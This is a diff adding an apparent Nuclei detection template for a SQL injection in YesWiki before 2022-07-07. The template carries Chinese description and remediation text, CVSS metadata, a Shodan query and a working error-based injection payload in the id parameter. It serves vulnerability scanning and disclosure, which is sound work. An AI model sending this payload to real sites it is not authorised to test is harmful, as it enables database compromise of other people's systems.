@@ -1,0 +1,40 @@
+id: yeswiki-sql-injection-before-2022-07-07
+
+info:
+  name: YesWiki 2022-07-07之前版本SQL注入漏洞
+  author: arafatansari
+  severity: critical
+  description: |
+    YesWiki 2022-07-07之前版本存在SQL注入漏洞，攻击者可通过AccueiL URL中的id参数进行利用，可能获取数据库敏感信息、修改数据，并在受影响站点上下文中执行未授权管理操作。
+  reference:
+    - https://huntr.dev/bounties/32e27955-376a-48fe-9984-87dd77e24985
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+    cwe-id: CWE-89
+  metadata:
+    verified: true
+    max-request: 1
+    shodan-query: http.html:"yeswiki"
+  tags: YesWiki
+  remediation: >-
+    所有数据库访问均应使用参数化查询或安全的 ORM，按照允许列表校验输入，并为应用配置最小权限的数据库账号。升级到厂商已修复的版本，在完成修复前限制对受影响端点的访问。
+
+variables:
+  num: "999999999"
+
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/?PagePrincipale/rss&id=1%27+and+extractvalue(0x0a,concat(0x0a,(select+concat_ws(0x207c20,md5({{num}}),1,user()))))--+-'
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'c8c605999f3d8352d7bb792cf3f'
+      - type: status
+        status:
+          - 200
+
+# digest: 490a00463044022012fa5f710b8dc5dcdcfb19ca2b22011bb9b3aaa8bf49d8f90441d1d433d71ace0220480b77dec63445676c07494cce44961ceeef1def725bca53157819783145255e:922c64590222798bb761d5b6d8e72950
